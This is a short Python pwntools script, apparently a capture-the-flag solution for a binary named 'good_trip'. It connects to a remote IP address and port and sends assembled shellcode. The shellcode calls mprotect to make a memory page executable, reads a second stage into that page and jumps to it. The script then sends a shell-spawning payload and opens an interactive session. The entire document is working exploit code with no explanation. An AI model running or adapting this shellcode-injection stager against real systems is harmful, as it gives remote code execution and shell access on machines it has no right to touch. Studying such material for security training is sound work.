#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./good_trip", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b exec")
p = remote("172.210.129.230", 1351)

payload = b"\x90" * 44 # nops to overwrite
payload += asm("mov rsp, 0x404500") # new stack
payload += asm("mov rdx, 7")
payload += asm("mov rsi, 4096")
payload += asm("movabs rdi, 0x1337131000")
payload += asm("mov rax, 0x00401090")
payload += asm("call rax") # mprotect(0x1337131000, 4096, 7)
payload += asm("mov rdx, 100")
payload += asm("mov rsi, 0x1337131000")
payload += asm("mov rdi, 0")
payload += asm("mov rax, 0x00401060")
payload += asm("call rax") # read(0, 0x1337131000, 100)
payload += asm("movabs rax, 0x1337131000")
payload += asm("jmp rax") # jmp 0x1337131000

p.readuntil(b"code size >> ")
p.sendline(str(len(payload)).encode())

p.readuntil(b"code >> ")
p.sendline(payload)

p.sendline(asm(shellcraft.sh()))

p.interactive()
